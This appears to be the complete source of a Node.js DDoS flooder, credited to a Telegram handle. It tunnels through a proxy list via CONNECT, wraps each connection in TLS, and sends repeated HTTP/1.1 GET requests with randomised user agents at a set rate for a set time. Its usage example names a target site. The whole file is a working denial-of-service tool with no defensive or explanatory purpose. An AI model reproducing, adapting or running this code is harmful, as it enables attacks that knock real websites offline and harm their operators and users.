const net = require("net");
const tls = require("tls");
const fs = require("fs");

console.log("Script by t.me/Lintar21");

if (process.argv.length < 6) {
    console.log("Usage: node http1-raw-tls.js URL TIME R/S PROXYFILE");
    console.log("Example: node http1-raw-tls.js https://sunda-gacor.xyz 120 8 http.txt");
    process.exit(1);
}

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(line => line.trim());
}

function randomElement(elements) {
    return elements[Math.floor(Math.random() * elements.length)];
}

function randomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function generateUserAgent() {
    const osList = ["Windows NT 10.0; Win64; x64", "Macintosh; Intel Mac OS X 10_15_7", "X11; Linux x86_64"];
    const browserList = [
        `Chrome/${randomInt(90, 120)}.0.${randomInt(4000, 5000)}.${randomInt(100, 200)}`,
        `Firefox/${randomInt(90, 120)}.0`,
        `Safari/${randomInt(12, 16)}.${randomInt(0, 9)}`
    ];
    const engineList = ["AppleWebKit/537.36 (KHTML, like Gecko)", "Gecko/20100101"];
    return `Mozilla/5.0 (${randomElement(osList)}) ${randomElement(engineList)} ${randomElement(browserList)}`;
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    rate: parseInt(process.argv[4]),
    proxyFile: process.argv[5]
};

const url = new URL(args.target);
const host = url.hostname;
const path = url.pathname || "/";
const port = 443;
const proxies = readLines(args.proxyFile);

function generateRawRequest() {
    return [
        `GET ${path} HTTP/1.1`,
        `Host: ${host}`,
        `User-Agent: ${generateUserAgent()}`,
        `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8`,
        `Accept-Language: en-US,en;q=0.9`,
        `Accept-Encoding: gzip, deflate`,
        `Cache-Control: no-cache`,
        `Connection: keep-alive`,
        `\r\n`
    ].join("\r\n");
}

function runFlooder() {
    if (proxies.length === 0) return;

    const proxy = randomElement(proxies).split(":");
    const proxyHost = proxy[0];
    const proxyPort = parseInt(proxy[1]);

    const proxySocket = net.connect({
        host: proxyHost,
        port: proxyPort
    });

    proxySocket.setTimeout(10000);

    proxySocket.on("connect", () => {
        const connectPayload = `CONNECT ${host}:${port} HTTP/1.1\r\nHost: ${host}\r\n\r\n`;
        proxySocket.write(connectPayload);
    });

    proxySocket.on("data", (data) => {
        if (data.toString().includes("HTTP/1.1 200")) {
            const tlsSocket = tls.connect({
                socket: proxySocket,
                servername: host,
                rejectUnauthorized: false,
                ALPNProtocols: ["http/1.1"],
                ciphers: "ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256",
                minVersion: "TLSv1.2",
                maxVersion: "TLSv1.3",
                secureOptions: require("constants").SSL_OP_NO_SSLv2 | require("constants").SSL_OP_NO_SSLv3,
                honorCipherOrder: true,
                secure: true,
                requestCert: false,
                timeout: 10000
            });

            tlsSocket.setKeepAlive(true, 60000);

            let floodInterval;

            tlsSocket.on("secureConnect", () => {
                floodInterval = setInterval(() => {
                    if (tlsSocket.writable) {
                        for (let i = 0; i < args.rate; i++) {
                            tlsSocket.write(generateRawRequest());
                        }
                    }
                }, 1000);
            });

            tlsSocket.on("error", (err) => {
                console.error(`TLS Error: ${err.message}`);
                clearInterval(floodInterval);
                tlsSocket.destroy();
            });

            tlsSocket.on("timeout", () => {
                clearInterval(floodInterval);
                tlsSocket.destroy();
            });

            tlsSocket.on("end", () => {
                clearInterval(floodInterval);
                tlsSocket.destroy();
            });
        } else {
            proxySocket.destroy();
        }
    });

    proxySocket.on("error", (err) => {
        console.error(`Proxy Error: ${err.message}`);
        proxySocket.destroy();
    });

    proxySocket.on("timeout", () => {
        proxySocket.destroy();
    });

    proxySocket.on("end", () => {
        proxySocket.destroy();
    });
}

const mainInterval = setInterval(runFlooder, 1000);

setTimeout(() => {
    clearInterval(mainInterval);
    process.exit(0);
}, args.time * 1000);

console.log(`Starting HTTP/1.1 raw TLS flood on ${args.target} for ${args.time} seconds with ${args.rate} req/s`);
